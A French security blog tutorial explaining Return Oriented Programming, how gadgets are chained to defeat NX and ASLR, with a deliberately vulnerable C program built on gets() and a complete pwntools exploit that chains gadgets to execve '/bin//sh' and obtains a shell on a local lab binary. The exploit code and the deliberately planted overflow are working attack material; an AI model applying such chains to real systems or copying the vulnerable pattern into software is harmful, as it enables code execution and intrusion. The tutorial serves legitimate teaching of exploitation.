---
title: "ROP - Return Oriented Programming"
date: 2016-10-23  15:57:12
author: "Pixis"
layout: post
permalink: /return-oriented-programming/
disqus_identifier: 0000-0000-0000-0016
cover: assets/uploads/2016/07/kernel_3.jpg
tags:
  - userland
  - tuto
---

Cet article a pour but d'expliquer clairement ce qu'est le ROP ou Return Oriented Programming. Qu'est-ce que cette technique ? Pourquoi est-elle utile ? Quelles sont les limites ? Comment la mettre en place ? Nous allons répondre ensemble à ces différentes questions.

<!--more-->


## Rappels

Nous avons vu dans des précédants articles deux techniques d'exploitation suite à un buffer overflow. La première était une [introduction et exploitation simple des buffer overflow (stack-based)](http://blog.hackndo.com/buffer-overflow-stack-based/) lorsque nous n'avions aucune protection. La pile était exécutable et la distribution aléatoire de l'adressage (ASLR - _Address Space Layout Randomization_) n'était pas activée. Nous reviendrons sur ces protections dans la suite.

Nous avons alors détaillé une technique pouvant être utilisée lorsque la pile n'était plus exécutable. Pour cela, vous pouvez lire l'article sur [le retour à la libc](http://blog.hackndo.com/retour-a-la-libc/), mais celui-ci ne fonctionne plus lorsque l'ASLR est activé.

Cet article a alors pour but d'exposer une nouvelle technique d'exploitation, le ROP (_Return Oriented Programming_) qui permet malgré ces différentes protections de détourner de flux d'exécution d'un programme afin d'en prendre le contrôle.

## Théorie

### ASLR

Lorsque vous exécutez un programme, les entêtes du binaires sont supposés donner l'emplacement des différents segments/sections. Ainsi, à chaque fois qu'on lance le binaire, les adresses ne varient pas. La pile commence toujours au même endroit, même chose pour le tas, ainsi que les segments du binaire (Mais si ! Vous savez, on a tout expliqué dans l'article sur [la gestion de la mémoire](http://blog.hackndo.com/gestion-de-la-memoire/)).

Et bien l'ASLR est une protection dans la noyau qui va rendre certains espaces d'addressages aléatoires. Généralement, la pile, le tas et les bibliothèques sont impactées. Il n'est alors plus possible de retrouver à coup sûr l'adresse d'un shellcode placé sur la pile, ou l'adresse de la fonction `system` dans la libc. C'est bien ennuyant.

Mais ne vous inquiétez pas, ROP est là pour nous sauver.

### ROP - Return Oriented Programming

Si vous aviez suivi l'article sur [le retour à la libc](http://blog.hackndo.com/retour-a-la-libc/), alors sachez que c'était une sorte d'introduction au ROP.

Nous sommes toujours dans le même contexte. Un binaire est vulnérable au buffer overflow. Cependant ce binaire possède les deux protections que nous avons évoquées

* **NX** : C'est le nom répandu de la protection qui rend la pile **N**on e**X**écutable. Finis les shellcode sur la pile, que ce soit dans le buffer ou dans des variables d'environnement.
* **ASLR** : En plus de ne plus être exécutable, la pile bouge d'une exécution à l'autre, tout comme le tas ou les librairies. Donc cette fois, nous ne pouvons plus trouver à coup sûr l'adresse de `system` comme nous l'avions fait dans l'article sur [le retour à la libc](http://blog.hackndo.com/retour-a-la-libc/).

Pour pallier à ces deux protections, il faut alors trouver une technique d'exploitation qui n'exécute rien sur la pile, et qui utilise des informations qui ne bougent pas d'une exécution à l'autre. Pour cela, nous allons utiliser du code qui a déjà été créé. Et quoi de plus simple qu'utiliser le code du binaire que nous voulons exploiter ?

#### Les gadgets

Il est vrai qu'un binaire possède rarement le code permettant de lancer un shell. Ce serait trop beau. Cependant nous pouvons trouver à un endroit un bout de code qui permet de faire une action, puis à un autre endroit un autre bout de code qui permet de faire autre chose, et ainsi de suite. De cette façon, en enchaînant ces petits bouts d'instructions, on peut finalement réussir à faire des actions qui n'étaient pas prévues par le binaire.

Un example pas vraiment réaliste mais qui permet d'illustrer mes propos. Considérons la suite d'instruction présente, qui se trouve dans le binaire :

```sh
[1] PUSH    EBP
[2] MOV     EBP, ESP
[3] SUB     ESP, 0x40
[4] XOR     EAX, EAX
[5] PUSH    EAX
[6] MOV     EAX, 0x41424344
[7] PUSH    EAX
[8] CALL    PRINTF
```

Le code précédant est un prologue de fonction, et place la chaine de caractère `ABCD\x00` sur la pile avant d'appeler la fonction `printf`. Remarquez que j'ai numéroté les lignes. Si maintenant nous prenons les instructions dans un nouvel ordre, par exemple [4] puis [5] suivi de [1] et enfin [8] alors nous aurions

```sh
[4] XOR     EAX, EAX
[5] PUSH    EAX
[1] PUSH    EBP
[8] CALL    PRINTF
```

Dans ce cas, nous aurions `0x00` sur la pile suivi de la valeur de `EBP` et enfin un appel à `printf`. Le résultat ne serait plus du tout le même. Pour peu que d'une certaine manière, nous contrôlions `EBP`, nous pourrions alors afficher ce que nous voulons, et pourquoi pas enchaîner sur une vulnérabilité de type chaîne de format.

Mais ce n'est pas tout, nous pouvons aller encore plus loin. Voilà la représentation en hexadécimal des instructions précédentes

```sh
55                  PUSH    EBP
89 e5               MOV     EBP, ESP
81 ec 40 00 00 00   SUB     ESP, 0x40
33 c0               XOR     EAX, EAX
50                  PUSH    EAX
b8 44 43 42 41      MOV     EAX, 0x41424344
50                  PUSH    EAX
e8 b1 69 00 00      CALL    PRINTF
```

Nous avons pensé à mélanger les instructions, mais il est également possible d'exécuter des morceaux d'instructions.

Je m'explique. Une analogie existe avec la langue françase.

Dans le mot "République", même si ce n'était pas mon intention, il y a aussi les mots "Pub", "Pu", "Publique" etc. Ce n'était pas le sens que je cherchais, mais rien n'empêche de ne choisir de lire que ces parties là. Cela n'est possible que parce que les mots de la langue française ne sont pas tous de taille égale. Si tous les mots français faisaient **exactement** 10 lettres, alors on ne pourrait pas trouver de sous-mot, puisqu'il aurait une taille inférieure.

De la même manière, nous pouvons appliquer ce principe à l'exemple précédant car les instructions ne sont pas de taille fixe. Nous somme sur une architecture [CISC](https://fr.wikipedia.org/wiki/Complex_instruction_set_computing). (Cela sort un peu du sujet, mais je jugeais bon d'expliquer **pourquoi** c'est possible dans la majorité des cas, tout en ayant en tête que les architectures RISC ne sont pas concernées par le ROP).

Bref, vous avez compris le principe : Nous allons piquer des morceaux d'instructions à droite et à gauche, pas forcément des bouts d'instructions prévues par le programmeur, et en les mettant bout en bout, nous allons exécuter du code arbitraire.

Ces bouts d'instructions sont appelés des **gadgets**.

#### Utilisation des gadgets

Tout ça, c'est chouette, mais alors comment exécuter ces bouts d'instruction, ces gadgets ?

Dans un buffer overflow, lorsque nous écrasons suffisamment de données, nous finissons par écraser la sauvegarde de `EBP` (poussée sur la pile durant le prologue d'une fonction) puis la sauvegarde de `EIP` de la fonction appelante. Nous pouvons alors rediriger le programme là où nous le souhaitons, vers un gadget qui nous intéresse.

Cependant, une fois que ce morceau de code (gadget) est exécuté, nous souhaitons reprendre le contrôle du flux d'exécution pour sauter sur le deuxième gadget.

Cette contrainte fait que les gadget ont presque toujours la même forme :

```
<instruction 1>
<instruction 2>
...
<instruction n>
RET
```

Ainsi, lorsque les instructions que nous voulons effectuer ont été exécutées, l'instruction `RET` permet de sauter à l'instruction dont l'adresse est sur le dessus de la pile, pile que nous contrôlons grâce au buffer overflow.

Voici un exemple concret. Imaginons que dans l'ensemble des instructions de mon binaire, je trouve à différents endroits les instructions suivantes

```sh
# 0x08041234 Instructions 1
INC   EAX
RET

# 0x08046666 Instructions 2
XOR   EAX, EAX
RET

# 0x08041337 Instructions 3
POP   EBX
RET

# 0x08044242 Instructions 4
INT   0x80
```

Vous voyez que nous avons les adresses de ces 4 gadgets (suites d'instructions) `0x08041234`, `0x08046666`, `0x08041337` et `0x08044242`.

Pour que l'example reste simple, nous allons effectuer un appel système `sys_exit` avec comme argument la valeur `3` (Pour tous les appels systèmes vous pouvez jeter un oeil à mon github pour les architectures [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md) et les [64 bits](https://github.com/Hackndo/misc/blob/master/syscalls64.md)).

D'après le tableau 32 bits, pour faire un appel système à `sys_exit`, `EAX` doit prendre la valeur **1** et `EBX` la valeur du code de retout, ici **3** comme nous l'avons décidé.

Afin d'obtenir ces valeurs, en ayant les 4 différentes suites d'instructions précédentes, nous pouvons faire ceci :

```sh
XOR    EAX, EAX		# Pour que EAX = 0
INC    EAX		# Afin que EAX = 1
POP    EBX		# En faisant en sorte que la valeur 0x00000003 soit sur la pile
INT    0x80		# Permettant de faire l'appel système
```

Ces différentes instructions mises bout à bout avec les bonnes valeurs sur la pile devraient appeler la fonction `exit(3)`.

Revenons à notre buffer overflow. Nous avons réécrit la valeur de la sauvegarde de `EIP` de la fonction appelante. Ainsi, lorsque notre fonction aura terminé de s'exécuter, nous serons redirigé vers la valeur que nous avons mis sur la sauvegarde de `EIP`.

Nous allons donc rediriger le flux d'exécution vers la première instruction que nous souhaitons exécuter, qui est le `XOR EAX, EAX`. La pile ressemblera alors à ceci

[![first_gadget]({{ site.baseurl }}assets/uploads/2016/10/first_gadget.png)]({{ site.baseurl }}assets/uploads/2016/10/first_gadget.png)

Le flux d'exécution va être redirigé vers les instructions

```sh
# 0x08041234 Instructions 1
XOR    EAX, EAX
RET
```

Une fois le `XOR` effectué, c'es l'instruction `RET` qui va être exécutée. Pour rappel, un `RET` n'est rien d'autre qu'un `POP EIP`. L'adresse sur le dessus de la pile va donc être mis dans le registre `EIP`. Comme l'adresse sur le dessus de la pile est juste après le sEIP que nous avons écrasé (et qui a déjà été `POP` par le `RET` de la fonction), il suffit de mettre l'adresse du deuxième gadget sur le sommet de la pile, comme suit :

[![second_gadget]({{ site.baseurl }}assets/uploads/2016/10/second_gadget.png)]({{ site.baseurl }}assets/uploads/2016/10/second_gadget.png)


Suivi ensuite du gadget qui permet de faire le `POP EBX`. Cependant ce gadget a besoin d'une valeur spécifique sur la pile, puisque le gadget va "popper" une valeur pour la mettre dans `EBX`. Nous aurons alors la pile suivante

[![third_gadget]({{ site.baseurl }}assets/uploads/2016/10/third_gadget.png)]({{ site.baseurl }}assets/uploads/2016/10/third_gadget.png)


Le `POP EBX` va alors retirer la valeur `0x00000003` de la pile. Tous nos registres sont prêts, il ne reste plus qu'à rediriger le flux vers l'instruction `int 0x80` qui effectue l'appel système

[![fourth_gadget]({{ site.baseurl }}assets/uploads/2016/10/fourth_gadget.png)]({{ site.baseurl }}assets/uploads/2016/10/fourth_gadget.png)


En organisant la pile de cette manière, nous aurons nos gadgets qui vont s'enchaîner, remplir les registres tel que nous le shouaitons avant d'effectuer l'appel système qui nous intéresse.

Passons maintenant à un cas concret.

## Pratique

_Dans cet exemple, je prendrai les adresses que j'ai sur ma machine, elles ne correspondront sans doute pas aux votres. Adaptez donc votre exemple en fonction des résultats des différentes commandes sur votre machine !_

Voici le programme vulnérable

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

# Pour la compilation, il faut ajouter ces informations pour avoir les bonnes protections
# gcc -o rop rop.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static

int main(int argc, char ** argv) {
    char buff[128];

    gets(buff);

    char *password = "I am h4cknd0";

    if (strcmp(buff, password)) {
        printf("You password is incorrect\n");
    } else {
        printf("Access GRANTED !\n");
    }

    return 0;
}
```

Vous remarquez l'évident buffer overflow, si nous passons à ce binaire un gros buffer, il va normalement nous renvoyer une erreur de segmentation.

```sh
$ perl -e 'print "A"x500' | ./rop
You password is incorrect
Segmentation fault (core dumped)
```

Comme le montre la commande suivante, la stack `GNU_STACK` n'a pas le flag `X` (seulement `RW`) donc elle n'est donc pas exécutable.

```sh
$ readelf -l rop

Elf file type is EXEC (Executable file)
Entry point 0x8048736
There are 6 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000000 0x08048000 0x08048000 0xa078d 0xa078d R E 0x1000
  LOAD           0x0a0f1c 0x080e9f1c 0x080e9f1c 0x01004 0x023c8 RW  0x1000
  NOTE           0x0000f4 0x080480f4 0x080480f4 0x00044 0x00044 R   0x4
  TLS            0x0a0f1c 0x080e9f1c 0x080e9f1c 0x00010 0x00028 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x0a0f1c 0x080e9f1c 0x080e9f1c 0x000e4 0x000e4 R   0x1

```

Par ailleurs, l'ASLR est activé comme le montre le flag situé ici

```sh
$ cat /proc/sys/kernel/randomize_va_space
2
```

Si vous n'avez pas le même résultat, avec un autre nombre que le `2`, alors effectuez cette commande pour activer l'ASLR.

```sh
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Vous pourrez toujours revenir à votre configuration d'origine en remettant le numéro que vous aviez initialement.

Nous allons essayer de lancer un shell avec ce programme, malgré les protections mises en place. Pour cela, nous allons avoir besoin de gadgets. Un outil extrêmement connu pour cette recherche s'appelle [ROPGadget](http://shell-storm.org/project/ROPgadget/), je vous laisse l'installer. Il est très puissant et possède tout un tas d'options.

Une commande de base est 

```sh
$ ROPGadget --binary rop

```

Cette commande va nous sortir tous les gadgets qui finissent par un RET avec 10 instructions ou moins avant.

En voici un extrait

```sh
[...]
0x0804c47e : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08050815 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805489f : xor eax, eax ; pop ebx ; pop esi ; ret
0x0805821f : xor eax, eax ; pop ebx ; ret
[...]
Unique gadgets found: 11840
```

Vous voyez qu'on a de quoi faire. 11840 résultats.

Si par exemple nous voulons trouver un `XOR EAX, EAX`

```sh
$ ROPgadget --binary rop | grep "xor eax"
[...]
0x08049323 : xor eax, eax ; ret
```

Parfait. Nous avons notre premier gadget qui nous sera utile.

Je vous rappelle que nous voulons exécuter un shell. Il nous faut alors lancer `sys_execve("/bin/sh", NULL, NULL)`.

D'après la table des appels systèmes [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md), la valeur de `EAX` pour un `execve` est de 11. Maintenant qu'on a un gadget qui initialise `EAX` à zéro, il faut par exemple l'incrémenter.

```sh
$ ROPgadget --binary rop | grep "inc eax"
[...]
0x0804812c : inc eax ; ret
[...]
```

Parfait, so far so good.

Il nous faut ensuite faire en sorte que `EBX` pointe sur la chaine de caractère "/bin/sh", et que `ECX` et `EDX` soient des pointeurs nuls, car nous n'en avons pas besoin.

Pour pointer sur la chaine de caractère "/bin/sh", il faut la placer en mémoire. Pour cela, il faut pouvoir écrire où nous le souhaitons. C'est une suite de gadget assez recherchée en général, et elle a un nom bien précis **Write-what-where**.

En voici un exemple avec les gadgets proposés par le binaire

```sh
0x0806ed1a : pop edx ; ret
0x080b8056 : pop eax ; ret
0x080546db : mov dword ptr [edx], eax ; ret
```

Avec ces trois gadgets, nous contrôlons les contenus des registres `EDX` et `EAX`, puis nous pouvons déplacer le contenu de `EAX` à l'adresse pointée par `EDX`. Nous écrivons donc ce que nous voulons, là où nous le shouaitons. Parfait !

Nous sommes donc en mesure d'écrire "/bin/sh" quelque part en mémoire, par exemple dans .data qui ne bouge pas malgré l'ASLR.

```sh
$ readelf -S rop | grep " .data "
  [23] .data             PROGBITS        080ea000 0a1000 000f20 00  WA  0   0 32
```

`.data` possède le flag `W` comme **W**ritable et se situe à l'adresse `0x080ea000`.

Enfin, nous devons trouver des gadgets pour contrôler nos registres `EBX` et `ECX` (car nous avons déjà trouvé un gadget pour `EDX` lors du _write-what-where_). Vous avez compris la technique, en voici deux :

```sh
0x080de7ad : pop ecx ; ret
0x080481c9 : pop ebx ; ret
```

Bien sûr, pour pouvoir exécuter tout ça, il faut faire un appel à une instruction `int 0x80`

```sh
0x0806c985 : int 0x80
```

Et bien c'est parfait, nous avons maintenant tous les gadgets en main pour pouvoir effectuer notre ROP. Pour la construction de la chaine, nous allons procéder comme suit :

* Placer "/bin/sh" au début de `.data`
* Placer des octets nuls juste après, pour que la chaine "/bin/sh" se termine par un caractère nul.
* Mettre l'adresse de "/bin/sh" dans `EBX`
* Mettre des `0x00` dans ECX et EDX
* Mettre 11 (0xb) dans `EAX` (numéro du syscall)
* Faire un appel à `int 0x80`


Voici un code python qui prépare le débordement en chainant les gadgets.

```python
p =  pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea000) 		# Dans edx, nous mettons l'adresse du début de .data
p += pack('<I', 0x080b8056) 		# pop eax ; ret
p += '/bin'				# Dans eax, nous mettons la chaine de caractères "/bin"
p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea004) 		# Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
p += pack('<I', 0x080b8056) 		# pop eax ; ret
p += '//sh'				# Nous mettons "//sh" dans eax
p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x080ea008) 		# Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
p += pack('<I', 0x080481c9) 		# pop ebx ; ret
p += pack('<I', 0x080ea000) 		# Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
p += pack('<I', 0x080de7ad) 		# pop ecx ; ret
p += pack('<I', 0x00000000) 		# On met ecx à 0
p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
p += pack('<I', 0x00000000) 		# On met edx à 0
p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
for i in range(11):			# Afin d'avoir eax = 11, on boucle 11 fois
	p += pack('<I', 0x0804812c)	# inc eax ; ret
p += pack('<I', 0x0806c985) 		# int 0x80
```

Rappelez-vous cependant que cette suite de gadgets, appelée **ropchain**, est initiée lors du retour de la fonction. Donc la première instruction de cette **ropchain** doit écraser la sauvegarde de `EIP` de la fonction appelante.

Nous avons vu en détails dans différents articles comment trouver la taille du buffer à allouer avant d'écraser la sauvegarde de `EIP`, et dans mon cas c'est un buffer de 148 octets. Ainsi, mon exploit ressemble à cela en python, en utilisant `pwntools`

```python
#coding: utf-8

from pwn import *
from struct import pack

r = process("./rop")

p = "A"*148

p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
p += pack('<I', 0x080ea000) 	# Dans edx, nous mettons l'adresse du début de .data
p += pack('<I', 0x080b8056) 	# pop eax ; ret
p += '/bin'						# Dans eax, nous mettons la chaine de caractères "/bin"
p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
p += pack('<I', 0x080ea004) 	# Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
p += pack('<I', 0x080b8056) 	# pop eax ; ret
p += '//sh'						# Nous mettons "//sh" dans eax
p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
p += pack('<I', 0x080ea008) 	# Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
p += pack('<I', 0x08049323) 	# xor eax, eax ; ret
p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
p += pack('<I', 0x080481c9) 	# pop ebx ; ret
p += pack('<I', 0x080ea000) 	# Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
p += pack('<I', 0x080de7ad) 	# pop ecx ; ret
p += pack('<I', 0x00000000) 	# On met ecx à 0
p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
p += pack('<I', 0x00000000) 	# On met edx à 0
p += pack('<I', 0x08049323) 	# xor eax, eax ; ret
for i in range(11):				# Afin d'avoir eax = 11, on boucle 11 fois
	p += pack('<I', 0x0804812c) # inc eax ; ret
p += pack('<I', 0x0806c985) 	# int 0x80

r.sendline(p)

r.interactive()
```

Ainsi, lorsque nous lançons notre exploit, nous récupérons bien un shell

```sh
$ python exploit.py 
[+] Starting local process './rop': Done
[*] Switching to interactive mode
You password is incorrect
$ 
```

ROP, c'est super chouette, amusez vous avec ça. Dans mon exemple, je n'avais malheureusement pas de gadget de la form

```sh
int 0x80
ret
```

Donc je ne pouvais pas enchaîner les appels systèmes. Mais si vous avez ça dans un autre binaire, alors vous pouvez enchaîner presque autant d'appels systèmes que vous le souhaitez, et vous pouvez ainsi construire une chaine d'exécution complexe, seulement en utilisant des bouts de codes à droite et à gauche.

Have fun !